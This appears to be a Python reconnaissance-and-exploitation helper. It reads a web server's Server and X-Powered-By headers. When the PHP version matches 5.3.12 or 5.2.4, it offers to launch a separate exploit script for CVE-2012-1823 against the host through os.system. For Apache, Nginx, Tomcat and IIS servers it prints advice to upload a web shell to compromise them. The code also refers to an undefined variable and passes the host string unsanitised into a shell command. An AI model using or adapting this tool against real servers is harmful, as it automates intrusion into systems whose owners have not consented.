
import os
import requests
from colorama import Fore

def web_request(host):
    try:
        r = requests.get("http://" + host)
        header = r.headers['Server']
        php_version = r.headers['X-Powered-By']
        php_exploit = "Exploits/PHP/18836.py"
        
        print("[" + Fore.CYAN + "PHP Version" + Fore.RESET + "] " + php_version)
        if '5.3.12' in php_version or '5.2.4' in php_version:
            print("[" + Fore.RED + "Vulnerable" + Fore.RESET + "] PHP Version Vulnerable to " + Fore.RED + "CVE-2012-1823" + Fore.RESET)
            php_question = input("[" + Fore.CYAN + "Question" + Fore.RESET + "] Run Exploit " + Fore.YELLOW + "Y/N " + Fore.RESET)
            if php_question.upper() == "Y":
                os.system("python3 " + php_exploit + " http://" + host)
            
        
        if 'Apache' in header or 'Nginx' in header:
            print("[" + Fore.CYAN + "Webserver" + Fore.RESET + "] " + header + Fore.RESET)
            print("[" + Fore.CYAN + "Exploit Method" + Fore.RESET + "] " + "Upload PHP Shell to Compromise Server" + Fore.RESET)
            
        if 'Coyote' in headers or 'Tomcat' in headers:
            print("[" + Fore.CYAN + "Webserver" + Fore.RESET + "] " + header + Fore.RESET)
            print("[" + Fore.CYAN + "Exploit Method" + Fore.RESET + "] " + "Upload JSP Shell to Compromise Server" + Fore.RESET)
            
        if 'Microsoft' in header:
            print("[" + Fore.CYAN + "Webserver" + Fore.RESET + "] " + header + Fore.RESET)
            print("[" + Fore.CYAN + "Exploit Method" + Fore.RESET + "] " + "Upload ASPX Shell to Compromise Server" + Fore.RESET)
            
        
        
    except:
        print("[" + Fore.RED + "ERROR" + Fore.RESET + "] HTTP Server Unreachable")
        pass
